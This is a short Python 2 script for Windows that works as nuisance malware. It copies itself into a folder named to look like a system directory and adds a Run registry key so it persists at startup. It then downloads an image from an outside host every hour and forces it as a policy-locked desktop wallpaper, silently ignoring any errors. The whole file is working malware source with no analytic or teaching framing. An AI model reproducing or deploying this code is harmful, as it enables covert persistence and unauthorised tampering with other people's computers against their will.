from sys import argv
import os 
import shutil
from _winreg import *
import urllib
from time import sleep

def replicate():
	directory_name= r"C:\Windows Files\system_32\drivers\etc\files\host"
	file_name= argv
	
	if not os.path.exists(directory_name):
		os.makedirs(directory_name)

	temp=file_name[0].split("/")
	name="\\".join(temp)
	print name,directory_name
	shutil.copy2(name,directory_name)




def startupEntry():
	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

	key2change= OpenKey(HKEY_CURRENT_USER,
	keyVal,0,KEY_ALL_ACCESS)

	temp=argv
	name=temp[0].split("/")[-1]

	SetValueEx(key2change, "File",0,REG_SZ, "C:\\Windows\\system_32\\drivers\\etc\\files\\host\\"+name)


def retreivePic():
	urllib.urlretrieve ("http://attitudesinghrajput.site90.com/image.jpg", "C:\\Windows Files\\system_32\\drivers\\etc\\files\\host\\image.jpg")
	picName="C:\\Windows Files\\system_32\\drivers\\etc\\files\\host\\image.jpg"
	return picName


def fixIt(picName):
	#keyVal= r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
	key2change= OpenKey(HKEY_CURRENT_USER,
	"Software\Microsoft\Windows\CurrentVersion\Policies",0,KEY_ALL_ACCESS)
	CreateKeyEx(key2change,"System")

	key2change= OpenKey(HKEY_CURRENT_USER,
	"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,KEY_ALL_ACCESS)
	SetValueEx(key2change, "Wallpaper",0,REG_SZ, picName)
	SetValueEx(key2change, "WallpaperStyle",0,REG_SZ, "0")



def main():
	try:
		replicate()
		# print "replicate done"
		startupEntry()
		# print "startup entry done"
	except:
		pass
	while True:
		try:
			picName=retreivePic()
			fixIt(picName)
			sleep(3600)
		except:
			sleep(60)



if __name__== "__main__":
	main()